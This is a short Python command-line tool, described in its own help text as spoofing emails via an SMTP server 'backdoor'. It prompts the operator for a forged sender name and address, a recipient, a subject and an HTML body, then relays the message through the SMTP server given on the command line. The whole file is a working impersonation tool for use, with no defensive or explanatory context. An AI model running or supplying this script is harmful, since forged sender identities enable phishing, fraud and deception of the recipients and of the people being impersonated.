import smtplib, argparse, base64
from email.mime.text import MIMEText

parser = argparse.ArgumentParser(description="Spoof emails via SMTP server backdoor.")
parser.add_argument('address', type=str, help='SMTP server address') # define SMTP server address, can be IP or URL
parser.add_argument('port', type=int, help='SMTP server port') # define SMTP port, default is 25
args = parser.parse_args()
mailServerAddress = str(args.address)
mailServerPort = int(args.port)

class ct: # colour text
    HEADER = '\033[95m'
    ENDC = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    BOLD = '\033[1m'
    SUCCESS = "[\033[92m√\033[0m] "
    ERROR = "[\033[91m!\033[0m] "
    NOTE = "[\033[93m#\033[0m] "

class mailOps:
    @staticmethod
    def testConnection(mailServerAddress, mailServerPort): # test connection to the mail server
        print(ct.NOTE + "Testing connection to the mail server...")
        smtp = smtplib.SMTP(mailServerAddress, mailServerPort)
        if smtp.noop()[0] == 250: # check for the success code 250
            return True # return true if successful
        else:
            return False # return false if failed

    @staticmethod
    def sendEmail(): # spoof email function
        emailSource = input("Enter sender email address: ")
        emailSourceName = input("Enter sender full name: ")
        print(ct.NOTE + """Email will be sent from "{}" with email "{}" """.format(emailSourceName, emailSource))
        emailRecipient = input("Enter recipient email: ")
        emailRecipientName = input("Enter recipient full name: ")
        print(ct.NOTE + """Email will be sent to "{}" with email "{}" """.format(emailRecipientName, emailRecipient))
        emailSubject = input("Enter email subject: ")
        print("Enter email body (press enter on a blank line to send): ")
        lines = [] # adapted from https://stackoverflow.com/questions/30239092/how-to-get-multiline-input-from-user/30239138
        while True:
            line = input()
            if line:
                lines.append(line)
            else:
                break
        emailMessage = '<br>'.join(lines)
        message = MIMEText(emailMessage, "html")
        message["From"] = "{} <{}>".format(emailSourceName, emailSource)
        message["To"] = "{} <{}>".format(emailRecipientName, emailRecipient)
        message["Subject"] = "{}".format(emailSubject)
        emailBody = message.as_string()
        #print("\n" + emailBody + "\n") # print the email raw details
        print(ct.NOTE + "Sending email...")
        try: # try to send the email
            smtp = smtplib.SMTP(mailServerAddress, mailServerPort)
            #smtp.set_debuglevel(1) # set debug level to print traceback
            smtp.sendmail(from_addr=emailSource, to_addrs=emailRecipient, msg=emailBody) # send the email to the server for routing
            print(ct.SUCCESS + "Email sent successfully!") # that worked
            exit()
        except smtplib.SMTPSenderRefused: # bad sender email
            print(ct.ERROR + "Bad sender email address specified!")
            exit()
        except smtplib.SMTPRecipientsRefused: # bad recipient email
            print(ct.ERROR + "Bad recipient email address specified!")
            exit()
        except smtplib.SMTPResponseException:
            print(ct.ERROR + "Error while sending email.") # that didn't work
            exit()

mail = mailOps() # define mailOps class
try:
    print(ct.HEADER + ct.BOLD + "Spoof email sender" + ct.ENDC)
    if mail.testConnection(mailServerAddress, mailServerPort) == True:
        print(ct.SUCCESS + "Connection established!")
        mail.sendEmail() # call the send email function
    else:
        print(ct.ERROR + "Unable to connect to server.")
        exit()
except KeyboardInterrupt:
    print("\n" + ct.NOTE + "Quitting...")
    exit()
